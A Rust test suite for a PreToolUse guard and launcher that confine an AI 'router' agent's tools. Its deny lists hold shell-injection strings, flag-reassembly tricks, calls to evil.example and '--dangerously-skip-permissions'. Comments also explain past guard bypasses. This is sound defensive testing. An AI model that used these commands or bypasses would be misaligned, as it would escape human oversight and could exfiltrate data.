//! The router's enforcement surface (E-ROUTER close review): the PreToolUse guard
//! `scripts/router-guard.jq` as `.claude/settings.json` wires it, the headless launcher
//! `scripts/router-worker.sh` (with a stub `claude`) including its `wait` mode, and the shipped PUSHED watch probe.
//! Needs `jq`, `sh`, `uuidgen` and `shasum` on PATH, as the guard and launcher do.
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::time::{Duration, Instant};
use tempfile::TempDir;

mod common;

fn root() -> &'static Path {
    Path::new(env!("CARGO_MANIFEST_DIR"))
}

/// Run the guard on one PreToolUse input; Some(reason) = denied, None = allowed.
fn guard(agent: &str, tool: &str, input: serde_json::Value) -> Option<String> {
    guard_event(serde_json::json!({"agent_type": agent, "tool_name": tool, "tool_input": input, "cwd": "/r"}))
}

/// Run the guard on one whole PreToolUse event; Some(reason) = denied, None = allowed.
fn guard_event(event: serde_json::Value) -> Option<String> {
    let mut p = Command::new("jq")
        .args(["-c", "-f"])
        .arg(root().join("scripts/router-guard.jq"))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    std::io::Write::write_all(&mut p.stdin.take().unwrap(), event.to_string().as_bytes()).unwrap();
    decision(&event, p.wait_with_output().unwrap())
}

/// The guard's verdict on `event` from its process output; Some(reason) = denied, None = allowed.
fn decision(event: &serde_json::Value, o: Output) -> Option<String> {
    assert!(o.status.success(), "guard errored on {event}: {}", String::from_utf8_lossy(&o.stderr));
    let out = String::from_utf8(o.stdout).unwrap();
    if out.trim().is_empty() {
        return None;
    }
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert_eq!(v["hookSpecificOutput"]["permissionDecision"], "deny", "{out}");
    Some(v["hookSpecificOutput"]["permissionDecisionReason"].as_str().unwrap().to_string())
}

fn bash(cmd: &str) -> Option<String> {
    guard("router", "Bash", serde_json::json!({ "command": cmd }))
}

fn settings() -> serde_json::Value {
    serde_json::from_str(&std::fs::read_to_string(root().join(".claude/settings.json")).unwrap()).unwrap()
}

/// Blocker 1 of the close review: `--out""put=` (and kin) reached the shell as `--output=` because the
/// hook judged raw shell text by substring. Every documented shape still passes.
#[test]
fn router_bash_guard_judges_plain_words_so_shell_cannot_reassemble_a_denied_flag() {
    for denied in [
        r#"git log -1 --format=#!/bin/sh%n --out""put=scripts/router-worker.sh"#,
        "git log -1 --out''put=x",
        r"git log -1 --out\put=x",
        "git log -1 --out{put,}=x",
        "git log -1 --outp=x",
        "git show --output=x HEAD",
        "git log $(id)",
        "git log `id`",
        "git status; rm -rf x",
        "git log | sh",
        "git log > x",
        "git log\nrm x",
        "git log -- *.rs",
        "gh pr list -R evil.example/a/b",
        "gh pr list --repo=evil.example/a/b",
        // fix-round re-check: a -R inside a short-flag cluster, a PR URL, gh's jq over the environment
        "gh pr list -dR evil.example/a/b",
        "gh pr view -cRevil.example/a/b 1",
        "gh pr view https://evil.example/o/SECRET/pull/1",
        "gh pr list --json number -q env",
        "gh pr view 1 --web",
        "scripts/router-worker.sh spawn a ../x .router/briefs/a.md opus",
        "scripts/router-worker.sh wait ../x",
        "scripts/router-worker.sh wait n;id",
        "scripts/router-worker.sh wait $(id)",
        "rm -rf x",
        "claude -p hi",
        "kill 1",
        "git -c core.pager=sh log",
        "scripts/router-watch.sh pushed 1a2b3c4 main --upload-pack=x",
        "scripts/router-watch.sh commit -b x y",
        "scripts/router-watch.sh commit b 1a2b3c4 ../x",
        "X=1 scripts/router-watch.sh signed 1a2b3c4",
        "scripts/router-watch.sh watch main",
        "scripts/router-watch.sh signed",
        "scripts/router-watch.sh signed $(id)",
        // the watch word class: plain words only, never a dots-only path, a rev expression or a flag
        "scripts/router-watch.sh merged 1a2b3c4 main+x",
        "scripts/router-watch.sh commit a:b 1a2b3c4",
        "scripts/router-watch.sh signed HEAD^",
        "scripts/router-watch.sh signed HEAD~1",
        "scripts/router-watch.sh merged 1a2b3c4 main@{1}",
        r#"scripts/router-watch.sh signed "1a2b3c4""#,
        "scripts/router-watch.sh signed '1a2b3c4'",
        r"scripts/router-watch.sh signed 1a2b\3c4",
        "scripts/router-watch.sh signed  1a2b3c4",
        "scripts/router-watch.sh commit b 1a2b3c4 .",
        "scripts/router-watch.sh commit b 1a2b3c4 ..",
        "scripts/router-watch.sh commit b 1a2b3c4 ...",
        "scripts/router-watch.sh pushed 1a2b3c4 a--output",
        "scripts/router-watch.sh signed x=y",
    ] {
        assert!(bash(denied).is_some(), "guard allowed {denied:?}");
    }
    // DoS: an unbounded trim once ran past the hook's 10s timeout, which Claude Code treats as allow
    let t = Instant::now();
    assert!(bash(&format!("rm -rf x{}y", " ".repeat(100_000))).is_some());
    assert!(t.elapsed() < Duration::from_secs(3), "guard took {:?} on a long command", t.elapsed());
    assert!(bash("rm x").unwrap().contains("scripts/router-watch.sh commit|signed|merged|pushed|tagged"), "deny message omits the watch shape");

    let mut allowed = vec![
        "git log --oneline -5".to_string(),
        "git diff HEAD~1 HEAD^ -- src/main.rs".into(),
        "git log -1 --notes=mr --format=%N 9787799dccec525966570861689ccb6e2c2fc615".into(),
        "git show HEAD:src/main.rs".into(),
        "gh pr view 12 --json title,state".into(),
        "gh pr list --state open -L 5 --author vuluu".into(),
        "gh pr status".into(),
        "scripts/router-worker.sh spawn e-x-w1 /Users/o/Keel-x .router/briefs/e-x-w1.md opus".into(),
        "scripts/router-worker.sh resume e-x-w1 0b8a4f4e-1c2d-4e5f-8a9b-0c1d2e3f4a5b /Users/o/Keel-x .router/briefs/e-x-w1-r1.md".into(),
        "scripts/router-worker.sh stop e-x-w1".into(),
        "scripts/router-watch.sh commit wu/E-SEED2/w12-owner-watch fa5a25d16d953d5858c35b58e6025a6a7903ff8b skills/keel-router/SKILL.md .claude/skills/keel-router/SKILL.md".into(),
        "scripts/router-watch.sh signed fa5a25d16d953d5858c35b58e6025a6a7903ff8b".into(),
        "scripts/router-watch.sh merged fa5a25d epic/E-SEED2".into(),
        "scripts/router-watch.sh pushed fa5a25d main".into(),
        "scripts/router-watch.sh tagged v0.2.0 fa5a25d".into(),
        "scripts/router-watch.sh commit b fa5a25d .claude/x .a.b/c".into(),
    ];
    // permissions.allow serves workers and the router alike: every router entry is a shape the guard
    // accepts (one source of truth, no drift); every worker-only entry is one it refuses the router.
    // the launcher and `router-watch.sh` (E-SEED2.W12) are router entries; cargo/keel are
    // worker-only, and these shapes stay refused whether or not settings lists them.
    let mut worker_only: Vec<String> =
        ["cargo test", "cargo build", "keel notes write test", "keel preflight wu HEAD", "keel check"].map(String::from).to_vec();
    for a in settings()["permissions"]["allow"].as_array().unwrap() {
        let a = a.as_str().unwrap().strip_prefix("Bash(").unwrap().strip_suffix(')').unwrap();
        let cmd = match a.strip_suffix(" *") {
            Some(p) if p.ends_with(" stop") => format!("{p} n"),
            Some(p) if p.ends_with("router-watch.sh") => format!("{p} signed 1a2b3c4"),
            Some(p) if p.starts_with("scripts/") => format!("{p} n /w .router/briefs/n.md opus"),
            Some(p) => format!("{p} HEAD"),
            None => a.to_string(),
        };
        if ["cargo ", "keel "].iter().any(|w| a.starts_with(w)) {
            worker_only.push(cmd);
        } else {
            allowed.push(cmd);
        }
    }
    for ok in &allowed {
        assert_eq!(bash(ok), None, "guard denied documented shape {ok:?}");
    }
    for w in &worker_only {
        assert!(bash(w).is_some(), "guard allowed worker-only {w:?} to the router");
    }
}

/// Review of 67b0de5: the guard must split gh's argv the way gh's flag parser (pflag) does. A
/// single-dash long name is a short flag plus an attached value to gh (`-label` = `-l abel`), so
/// the "value" after it becomes a flag of its own (`-label -R evil` really contacted evil.invalid);
/// a value starting with `-` is the same hole from the other side. Lists every leak, not the first.
#[test]
fn router_bash_guard_reads_gh_flags_as_gh_does() {
    let denied = [
        "gh pr list -label -R evil.example/a/b",
        "gh pr list -limit -R x/a/b",
        "gh pr list -author -R x/a/b",
        "gh pr list -label -q env --json number",
        "gh pr list -l -R x/a/b",
        "gh pr list -label --repo x/a/b",
        "gh pr list -author -w",
        // -s is --state to gh: only its enum check stops these today
        "gh pr list -state -R x/a/b",
        "gh pr list -search -R x/a/b",
        // gh has no -b/-h short today; one added later would make these live
        "gh pr list -base -R x/a/b",
        "gh pr list -head -R x/a/b",
        "gh pr view 1 -json -R x/a/b",
        // a value that is itself flag-shaped, and a short letter spelled as a long name
        "gh pr list --label -q env",
        "gh pr list --json=-R x/a/b",
        "gh pr list -L=-R x/a/b",
        "gh pr list --L 5",
    ];
    let leaks: Vec<_> = denied.iter().filter(|c| bash(c).is_none()).collect();
    assert!(leaks.is_empty(), "guard allowed {leaks:#?}");

    for ok in [
        "gh pr view 12 --json title,state",
        "gh pr list --state open -L 5 --author vuluu",
        "gh pr list -L=5 -s=open",
        "gh pr status",
        "gh pr status --json=a,b",
        "gh pr list -l bug -A vuluu -B main -H wu/x -S fix --label x --limit 3 --base main --head x --search y",
    ] {
        assert_eq!(bash(ok), None, "guard denied documented shape {ok:?}");
    }
}

/// Blocker 2 of the close review: `Agent`-tool subagents report their own agent_type, so the router
/// guard never sees them; the router may not start one, nor use any tool its agent file omits.
#[test]
fn router_guard_confines_the_router_to_its_tools_and_leaves_other_agents_alone() {
    for t in ["Agent", "Task", "Edit", "MultiEdit", "NotebookEdit", "Monitor", "mcp__x__y"] {
        assert!(guard("router", t, serde_json::json!({})).is_some(), "router may use {t}");
    }
    assert!(guard("router", "Skill", serde_json::json!({"skill": "code-review"})).is_some());
    assert_eq!(guard("router", "Skill", serde_json::json!({"skill": "keel-router"})), None);
    assert_eq!(guard("router", "Read", serde_json::json!({"file_path": "/etc/hosts"})), None);
    assert_eq!(guard("router", "Write", serde_json::json!({"file_path": "/r/.router/briefs/w1.md"})), None);
    for p in ["/r/.router/briefs/../x.md", "/r/scripts/router-worker.sh", "/r/.router/briefs/sub/x.md", "/r/.router/briefs/.x.md"] {
        assert!(guard("router", "Write", serde_json::json!({ "file_path": p })).is_some(), "router may Write {p}");
    }
    for a in ["worker", "general-purpose"] {
        assert_eq!(guard(a, "Bash", serde_json::json!({"command": "rm -rf x; claude -p hi"})), None);
        assert_eq!(guard(a, "Agent", serde_json::json!({})), None);
    }

    // the guard's tool list is exactly router.md's tools: line
    let agent = std::fs::read_to_string(root().join(".claude/agents/router.md")).unwrap();
    let mut md: Vec<&str> = agent.lines().find_map(|l| l.strip_prefix("tools:")).unwrap().split(',').map(str::trim).collect();
    let jq = std::fs::read_to_string(root().join("scripts/router-guard.jq")).unwrap();
    let def = jq.lines().find_map(|l| l.strip_prefix("def tools: [")).unwrap();
    let mut g: Vec<&str> = def.split(']').next().unwrap().split(',').map(|s| s.trim().trim_matches('"')).collect();
    md.sort();
    g.sort();
    assert_eq!(md, g, "router.md tools: and the guard's tools differ");
    assert!(!md.contains(&"Agent"), "router.md grants Agent");
}

/// Router SendMessage PreToolUse events as Claude Code 2.1.288 delivered them (E-ROUTER3.W1 capture;
/// ids and paths replaced). The harness adds type, recipient and content to what the router wrote,
/// which the old closed key set denied (backlog e-router-v2 R8).
const CAPTURED_SEND_MESSAGE: [&str; 2] = [
    r#"{"session_id":"s","transcript_path":"/t.jsonl","cwd":"/r","scratchpad_dir":"/t","prompt_id":"p","permission_mode":"default","agent_type":"router","hook_event_name":"PreToolUse","tool_name":"SendMessage","tool_input":{"to":"e-x-w1","message":"","notify_when_idle":true,"type":"message","recipient":"e-x-w1","content":""},"tool_use_id":"u1"}"#,
    r#"{"session_id":"s","transcript_path":"/t.jsonl","cwd":"/r","scratchpad_dir":"/t","prompt_id":"p","permission_mode":"default","agent_type":"router","hook_event_name":"PreToolUse","tool_name":"SendMessage","tool_input":{"to":"e-x-w1","summary":"ping","message":"ping: reply with pong","type":"message","recipient":"e-x-w1","content":"ping: reply with pong"},"tool_use_id":"u2"}"#,
];

/// E-ROUTER3.W1 (DEC-42): the router may message any named worker, an idle subscription or content
/// that steers it; the guard judges only the addressee, so harness-added keys never deny a call.
#[test]
fn router_guard_allows_send_message_to_a_named_worker_as_the_harness_sends_it() {
    for e in CAPTURED_SEND_MESSAGE {
        assert_eq!(guard_event(serde_json::from_str(e).unwrap()), None, "guard denied the captured {e}");
    }
    let send = |i: serde_json::Value| guard("router", "SendMessage", i);
    for ok in [
        serde_json::json!({"to": "e-x-w1", "notify_when_idle": true}),
        serde_json::json!({"to": "e-x-w1 [3fa9c1]", "message": "answer: keep the old flag", "summary": "answer"}),
        serde_json::json!({"to": "e-x-w1", "message": {"type": "shutdown_request"}}),
    ] {
        assert_eq!(send(ok.clone()), None, "guard denied {ok}");
    }
    for denied in [
        serde_json::json!({"message": "hi"}),
        serde_json::json!({"to": "", "message": "hi"}),
        serde_json::json!({"to": ["e-x-w1"], "message": "hi"}),
        serde_json::json!({"to": null, "notify_when_idle": true}),
        serde_json::json!("e-x-w1"),
        serde_json::json!(null),
    ] {
        assert!(send(denied.clone()).unwrap().contains("non-empty string"), "guard allowed {denied}");
    }
    assert_eq!(guard("router", "ListAgents", serde_json::json!({})), None);
    assert_eq!(guard("worker", "SendMessage", serde_json::json!({})), None);
}

/// Important of the close review: a hook that errors (no jq, no guard file) must deny, not allow.
#[test]
fn settings_run_the_guard_on_every_tool_and_fail_closed() {
    let pre = settings()["hooks"]["PreToolUse"].as_array().unwrap().clone();
    assert_eq!(pre.len(), 1, "one PreToolUse group: the guard");
    assert!(pre[0].get("matcher").is_none(), "the guard must see every tool");
    let cmd = pre[0]["hooks"][0]["command"].as_str().unwrap().to_string();
    let run = |dir: &Path, path: &str| {
        let mut p = common::cmd("/bin/sh")
            .args(["-c", &cmd])
            .env("CLAUDE_PROJECT_DIR", dir)
            .env("PATH", path)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        let ev = r#"{"agent_type":"router","tool_name":"Agent","tool_input":{}}"#;
        std::io::Write::write_all(&mut p.stdin.take().unwrap(), ev.as_bytes()).unwrap();
        p.wait_with_output().unwrap()
    };
    let path = std::env::var("PATH").unwrap();
    let o = run(root(), &path);
    assert!(o.status.success() && String::from_utf8_lossy(&o.stdout).contains("\"deny\""), "{o:?}");
    let empty = TempDir::new().unwrap();
    assert_eq!(run(empty.path(), &path).status.code(), Some(2), "missing guard file must block");
    assert_eq!(run(root(), empty.path().to_str().unwrap()).status.code(), Some(2), "missing jq must block");
}

/// Layered on `common::cmd` for the git W12's tests run (`git()`, the PUSHED probe, the e2e worktree
/// add, `Watcher::cmd` and the watch under it): only the repo's own config is read, so no user or
/// system setting (tag.gpgSign, log.showSignature, core.quotePath, ...) can change what it does, and
/// no inherited GIT_TRACE* or GIT_DEFAULT_HASH changes its output or its repos.
fn hermetic(c: &mut Command) -> &mut Command {
    let set: Vec<std::ffi::OsString> = c.get_envs().map(|(k, _)| k.to_owned()).collect();
    for k in std::env::vars_os().map(|(k, _)| k).chain(set) {
        if k.to_string_lossy().starts_with("GIT_TRACE") || k == "GIT_DEFAULT_HASH" {
            c.env_remove(k);
        }
    }
    c.env("GIT_CONFIG_GLOBAL", "/dev/null").env("GIT_CONFIG_NOSYSTEM", "1")
}

/// Upper bound on any wait for another process; a hung script fails the test instead of hanging it.
const BOUND: Duration = Duration::from_secs(10);

fn git(d: &Path, a: &[&str]) -> Output {
    let o = hermetic(&mut common::cmd("git"))
        .args(["-c", "core.hooksPath=/dev/null"])
        .args(a)
        .current_dir(d)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@t")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t")
        .output()
        .unwrap();
    assert!(o.status.success(), "git {a:?}: {}", String::from_utf8_lossy(&o.stderr));
    o
}

struct Launcher {
    _d: TempDir,
    main: PathBuf,
    wt: PathBuf,
    wt2: PathBuf,
    stub: PathBuf,
    state: PathBuf,
}

/// The stub `claude` the launcher runs through $ROUTER_CLAUDE, playing Claude Code 2.1.288's
/// background CLI as the E-ROUTER3.W10 probes saw it. Every call appends its working directory and
/// its argv (each argument bracketed, so boundaries are visible) to $STUB_STATE/calls and exits at
/// once. `--bg` lists a new idle background session in $STUB_STATE/sessions.json (named by `-n`, or on
/// `--resume` by the session's own saved name) and prints the `backgrounded` line; while
/// $STUB_STATE/refuse exists it prints that file and exits 1, and while $STUB_STATE/unlisted exists it
/// starts nothing it lists. `agents --json` prints the list, `stop <id>` delists the id, `rm` only records.
fn stub_claude(stub: &Path) {
    std::fs::write(stub, concat!(
        "#!/bin/sh\nS=$STUB_STATE\nprintf '%s ' \"$PWD\" >> \"$S/calls\"; printf '[%s]' \"$@\" >> \"$S/calls\"; echo >> \"$S/calls\"\n",
        "[ -s \"$S/sessions.json\" ] || echo '[]' > \"$S/sessions.json\"\n",
        "case \"$1\" in\n",
        "  agents) cat \"$S/sessions.json\"; exit 0;;\n",
        "  stop) jq --arg i \"$2\" 'map(select(.id != $i))' \"$S/sessions.json\" > \"$S/s.tmp\" && mv \"$S/s.tmp\" \"$S/sessions.json\"; echo \"stopped $2\"; exit 0;;\n",
        "  rm) echo \"removed $2\"; exit 0;;\n",
        "esac\n",
        "[ ! -e \"$S/refuse\" ] || { cat \"$S/refuse\"; exit 1; }\n",
        "name= sid=\nwhile [ $# -gt 0 ]; do case \"$1\" in -n) name=$2;; --resume) sid=$2;; esac; shift; done\n",
        "if [ -n \"$sid\" ]; then name=$(sed -n \"s/^$sid //p\" \"$S/names\"); else sid=$(uuidgen | tr A-F a-f); echo \"$sid $name\" >> \"$S/names\"; fi\n",
        "id=${sid%%-*}\n",
        "[ -e \"$S/unlisted\" ] || { jq --arg n \"$name\" --arg i \"$id\" --arg s \"$sid\" --arg c \"$PWD\" '. + [{pid: 1, id: $i, cwd: $c, kind: \"background\", sessionId: $s, name: $n, status: \"idle\", state: \"done\"}]' \"$S/sessions.json\" > \"$S/s.tmp\" && mv \"$S/s.tmp\" \"$S/sessions.json\"; }\n",
        "echo \"backgrounded · $id · $name\"\n"
    )).unwrap();
    std::fs::set_permissions(stub, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
}

/// `router-watch.sh` sleeps once per poll; this `<base>/shim/sleep` counts the polls in
/// $STEP_DIR/polls (its argument, one per line, in $STEP_DIR/sleeps) and blocks poll n until the test
/// creates $STEP_DIR/go-n, so each poll judges a state the test has set. It ends with its caller or the test process.
fn sleep_shim(base: &Path) {
    std::fs::create_dir_all(base.join("shim")).unwrap();
    std::fs::write(base.join("shim/sleep"), concat!(
        "#!/bin/sh\necho \"$1\" >> \"$STEP_DIR/sleeps\"\nn=$(( $(cat \"$STEP_DIR/polls\" 2>/dev/null || echo 0) + 1 ))\n",
        "echo \"$n\" > \"$STEP_DIR/polls.tmp\" && mv \"$STEP_DIR/polls.tmp\" \"$STEP_DIR/polls\"\n",
        "while [ ! -e \"$STEP_DIR/go-$n\" ] && kill -0 \"$STUB_OWNER\" 2>/dev/null && kill -0 \"$PPID\" 2>/dev/null; do /bin/sleep 0.02; done\n"
    )).unwrap();
    std::fs::set_permissions(base.join("shim/sleep"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
}

/// A repo whose main checkout holds the launcher, two linked worktrees and the stub claude.
fn launcher() -> Launcher {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let main = base.join("main");
    std::fs::create_dir_all(main.join("scripts")).unwrap();
    std::fs::create_dir_all(main.join(".router/briefs")).unwrap();
    std::fs::copy(root().join("scripts/router-worker.sh"), main.join("scripts/router-worker.sh")).unwrap();
    std::fs::write(main.join(".gitignore"), ".router/\n").unwrap();
    std::fs::write(main.join(".router/briefs/b.md"), "do the thing\n").unwrap();
    std::fs::create_dir_all(main.join(".keel")).unwrap();
    std::fs::copy(root().join(".keel/config.toml"), main.join(".keel/config.toml")).unwrap();
    git(&main, &["init", "-q", "-b", "main"]);
    git(&main, &["add", "."]);
    git(&main, &["commit", "-qm", "base"]);
    git(&main, &["worktree", "add", "-q", "../wt", "-b", "w"]);
    git(&main, &["worktree", "add", "-q", "../wt2", "-b", "w2"]);
    let stub = base.join("claude");
    stub_claude(&stub);
    let state = base.join("state");
    std::fs::create_dir_all(&state).unwrap();
    Launcher { main, wt: base.join("wt"), wt2: base.join("wt2"), stub, state, _d: d }
}

impl Launcher {
    fn run(&self, args: &[&str]) -> (bool, String) {
        self.run_env(args, &[])
    }

    fn cmd(&self, args: &[&str], env: &[(&str, &str)]) -> Command {
        let mut c = common::cmd("sh");
        c.arg("scripts/router-worker.sh")
            .args(args)
            .current_dir(&self.main)
            .env("ROUTER_CLAUDE", &self.stub)
            .env("STUB_STATE", &self.state)
            .envs(env.iter().copied());
        c
    }

    fn run_env(&self, args: &[&str], env: &[(&str, &str)]) -> (bool, String) {
        let o = self.cmd(args, env).output().unwrap();
        (o.status.success(), format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
    }

    /// Commit `config` as the main checkout's .keel/config.toml (None: remove it), the HEAD the launcher reads.
    fn commit_config(&self, config: Option<&str>) {
        let f = self.main.join(".keel/config.toml");
        match config {
            Some(c) => std::fs::write(&f, c).unwrap(),
            None => std::fs::remove_file(&f).unwrap(),
        }
        git(&self.main, &["add", "-A", ".keel"]);
        git(&self.main, &["commit", "-qm", "config"]);
    }

    /// The router closes an idle worker.
    fn stop(&self, name: &str) {
        let (ok, out) = self.run(&["stop", name]);
        assert!(ok && out.starts_with(&format!("STOPPED name={name} ")), "{out}");
    }

    /// How many sessions the launcher started under `name`.
    fn starts(&self, name: &str) -> usize {
        calls(&self.state).iter().filter(|(_, a)| a.first().map(String::as_str) == Some("--bg") && a.windows(2).any(|w| w[0] == "-n" && w[1] == name)).count()
    }

    fn sessions(&self) -> Vec<serde_json::Value> {
        serde_json::from_str(&std::fs::read_to_string(self.state.join("sessions.json")).unwrap()).unwrap()
    }

    fn set_sessions(&self, rows: &[serde_json::Value]) {
        std::fs::write(self.state.join("sessions.json"), serde_json::to_string(rows).unwrap()).unwrap();
    }
}

/// Every call the stub recorded under `state`: its working directory and its argv.
fn calls(state: &Path) -> Vec<(String, Vec<String>)> {
    std::fs::read_to_string(state.join("calls"))
        .unwrap_or_default()
        .lines()
        .map(|l| {
            let (dir, argv) = l.split_once(" [").unwrap();
            (dir.to_string(), argv.trim_end_matches(']').split("][").map(String::from).collect())
        })
        .collect()
}

fn field<'a>(out: &'a str, k: &str) -> &'a str {
    out.split_whitespace().find_map(|w| w.strip_prefix(k)).unwrap_or_else(|| panic!("no {k} in {out}"))
}

/// The launcher's refusals (none had a test before the close review), one live session per name
/// (E-ROUTER3.W10: any session the CLI lists under it, wherever it runs), and resume bound to its spawn.
#[test]
fn launcher_refuses_unsafe_targets_binds_resume_and_runs_one_worker_per_name() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let wt2 = l.wt2.to_str().unwrap();
    let main = l.main.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    for (args, why) in [
        (vec!["spawn", "n", main, brief, "opus"], "may not run in"),
        (vec!["spawn", "n", "/tmp", brief, "opus"], "not a registered worktree"),
        (vec!["spawn", "-n", wt, brief, "opus"], "bad name"),
        (vec!["spawn", "n", wt, brief, "gpt"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, brief, "sonnet"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, brief, "haiku"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, brief, "fable"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["resume", "n", "0b8a4f4e-1c2d-4e5f-8a9b-0c1d2e3f4a5b", wt, brief, "opus"], "resume <name> <uuid> <worktree> <note.md>"),
        (vec!["spawn", "n", wt, "scripts/router-worker.sh", "opus"], "file must be a .md under"),
    ] {
        let (ok, out) = l.run(&args);
        assert!(!ok && out.contains(why), "{args:?} not refused for {why}: {out}");
    }
    std::os::unix::fs::symlink(l.main.join(".router/briefs/b.md"), l.main.join(".router/briefs/s.md")).unwrap();
    let (ok, out) = l.run(&["spawn", "n", wt, ".router/briefs/s.md", "opus"]);
    assert!(!ok && out.contains("symlinks refused"), "{out}");

    let (ok, out) = l.run(&["spawn", "n", wt, brief, "opus"]);
    assert!(ok && out.starts_with("RUNNING"), "{out}");
    let sid = field(&out, "session=").to_string();
    let copy = field(&out, "brief=").to_string();
    assert!(copy.starts_with(wt) && std::fs::read_to_string(&copy).unwrap() == "do the thing\n", "{out}");

    // a second run under a live name is refused, spawn or resume
    let (ok, out) = l.run(&["spawn", "n", wt2, brief, "opus"]);
    assert!(!ok && out.contains("still running"), "{out}");
    let (ok, out) = l.run(&["resume", "n", &sid, wt, brief]);
    assert!(!ok && out.contains("still running"), "{out}");
    l.stop("n");

    // any listed session holds its name, whatever its directory or kind: SendMessage addresses by name
    let elsewhere = serde_json::json!({"id": "e1", "sessionId": "e1", "name": "n", "cwd": "/elsewhere", "kind": "interactive", "status": "busy"});
    l.set_sessions(&[elsewhere]);
    let (ok, out) = l.run(&["spawn", "n", wt, brief, "opus"]);
    assert!(!ok && out.contains("still running"), "{out}");
    l.set_sessions(&[]);

    // resume is bound to the spawn's name, session and worktree, and takes no option: a session
    // wakes with the options it was spawned with
    let (ok, out) = l.run(&["resume", "n", &sid, wt2, brief]);
    assert!(!ok && out.contains("was spawned in"), "{out}");
    let (ok, out) = l.run(&["resume", "m", &sid, wt, brief]);
    assert!(!ok && out.contains("no recorded spawn"), "{out}");
    let (ok, out) = l.run(&["resume", "n", &sid, wt, brief, "--effort", "high"]);
    assert!(!ok && out.contains("resume <name> <uuid> <worktree> <note.md>"), "{out}");
    let (ok, out) = l.run(&["resume", "n", &sid, wt, brief]);
    assert!(ok && out.starts_with(&format!("RUNNING name=n id={} session={sid} snapshot=", &sid[..8])), "{out}");
    let (dir, a) = calls(&l.state).into_iter().rfind(|(_, a)| a[0] == "--bg").unwrap();
    assert_eq!(dir, wt);
    assert_eq!(a[..3], ["--bg", "--resume", sid.as_str()], "{a:?}");
    assert!(a.len() == 4 && a[3].starts_with("Continue your work. Read ") && a[3].contains(field(&out, "brief=")), "{a:?}");
    l.stop("n");

    // E-SEED2.W7 (DEC-39): the policy is [router] in .keel/config.toml as committed at HEAD; anything
    // the launcher's narrow reader does not accept refuses the run and starts nothing
    let ok_policy = "[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n";
    let mut policy_refusals = vec![(None, "absent".to_string())];
    for (bad, what) in [
        ("code_paths = [\"src/\"]\n", "no [router]"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\n", "missing key"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"max\"\n", "default not in list"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"ultracode\"]\nworker_default_effort = \"medium\"\n", "unknown level"),
        ("[router]\nworker_model = opus\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "unquoted"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\" \"high\"]\nworker_default_effort = \"medium\"\n", "list without comma"),
        (&format!("{ok_policy}worker_model = \"opus\"\n"), "repeated key"),
        (&format!("{ok_policy}worker_extra = \"x\"\n"), "unknown key"),
        ("[router]\nworker_model = \"opus\"\n[other]\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "key outside the section"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\n[other]\nworker_default_effort = \"medium\"\n", "key after another section"),
        (&ok_policy.replace('\n', "\r\n"), "CRLF"),
        (&ok_policy.replace("worker_model = ", "worker_model\t=\t"), "tabs around ="),
        (&ok_policy.replace("\"opus\"", "'opus'"), "single quotes"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = []\nworker_default_effort = \"medium\"\n", "empty array"),
        (&ok_policy.replace("\"high\"]", "\"high\",]"), "trailing comma"),
        (&ok_policy.replace("[\"medium\", \"high\"]", "[\n  \"medium\",\n  \"high\",\n]"), "multi-line array"),
        (&format!("{ok_policy}[router.x]\ny = 1\n"), "[router.x]"),
        (&format!("{ok_policy}[[router]]\n"), "[[router]]"),
        (&format!("{ok_policy}[ router ]\n"), "spaced header"),
        (&format!("{ok_policy}[\"router\"]\n"), "quoted header"),
        (&format!("  {ok_policy}"), "indented header"),
        (&format!("{ok_policy}  [router]\n"), "indented second header"),
        (&format!("{ok_policy}[router]\n"), "duplicate section"),
        ("[router]\nworker_model = \"opus\"\n[review]\nx = 1\n[router]\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "split section"),
        (&ok_policy.replace("[router]\n", "[router]\t\n"), "trailing tab on header"),
        (&ok_policy.replace("[router]\n", "[router] \n"), "trailing space on header"),
        (&ok_policy.replace("\"opus\"", "\"--dangerously-skip-permissions\""), "model starting with -"),
        (&ok_policy.replace("\"opus\"", "\"4opus\""), "model starting with a digit"),
        (&ok_policy.replace("worker_default_effort = \"medium\"", "worker_default_effort = \"-medium\""), "effort starting with -"),
        ("[router]\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "missing worker_model"),
        (&ok_policy.replace("[router]\n", "[router]# c\n"), "no space before the header's comment"),
        (&format!("{ok_policy}\t[router]\n"), "tab-indented second header"),
        (&format!("{ok_policy}[\trouter]\n"), "tab inside a second header"),
        (&format!("{ok_policy}[router\t]\n"), "tab before a second header's ]"),
        (&ok_policy.replace("worker_model", "  worker_model"), "indented worker_model"),
        (&ok_policy.replace("worker_default_effort", "  worker_default_effort"), "indented worker_default_effort"),
